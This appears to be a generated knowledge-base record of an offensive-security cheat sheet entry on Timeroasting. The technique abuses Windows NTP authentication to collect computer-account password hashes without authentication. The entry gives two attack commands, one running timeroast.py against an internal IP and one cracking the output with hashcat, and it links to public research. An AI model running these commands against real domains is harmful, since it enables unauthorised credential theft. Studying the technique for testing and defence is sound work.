---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Roasting - Timeroasting

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-active-directory-ad-roasting-timeroasting` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/ad-roasting-timeroasting.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Timeroasting takes advantage of Windows' NTP authentication mechanism, allowing unauthenticated attackers to effectively request a password hash of any computer account by sending an NTP request with that account's RID

## Preserved Body

````markdown
> Timeroasting takes advantage of Windows' NTP authentication mechanism, allowing unauthenticated attackers to effectively request a password hash of any computer account by sending an NTP request with that account's RID

* [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - Timeroasting scripts by Tom Tervoort

    ```ps1
    sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
    hashcat -m 31300 ntp-hashes.txt
    ```

## References

* [On the Applicability of the Timeroasting Attack - snovvcrash - December 8, 2024](https://snovvcrash.rocks/2024/12/08/applicability-of-the-timeroasting-attack.html)
* [TIMEROASTING, TRUSTROASTING AND COMPUTER SPRAYING WHITE PAPER - Tom Tervoort](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
* [Timeroasting: Attacking Trust Accounts in Active Directory - Tom Tervoort - 01 March 2023](https://www.secura.com/blog/timeroasting-attacking-trust-accounts-in-active-directory)
````

## Source Verification

[source record](../../sources/internalallthethings/roasting-timeroasting.md)

## Evidence Excerpt

````text
_body: "# Roasting - Timeroasting\n\n> Timeroasting takes advantage of Windows' NTP authentication mechanism, allowing unauthenticated\
\ attackers to effectively request a password hash of any computer account by sending an NTP request with that account's\
\ RID\n\n* [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - Timeroasting scripts by Tom Tervoort\n\n    ```ps1\n\
\    sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt\n    hashcat -m 31300 ntp-hashes.txt\n    ```\n\n## References\n\
\n* [On the Applicability of the Timeroasting Attack - snovvcrash - December 8, 2024](https://snovvcrash.rocks/2024/12/08/applicability-of-the-timeroasting-attack.html)\n\
* [TIMEROASTING, TRUSTROASTING AND COMPUTER SPRAYING WHITE PAPER - Tom Tervoort](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)\n\
* [Timeroasting: Attacking Trust Accounts in Active Directory - Tom Tervoort - 01 March 2023](https://www.secura.com/blog/timeroasting-attacking-trust-accounts-in-active-directory)"
_relative_path: active-directory/ad-roasting-timeroasting.md
````
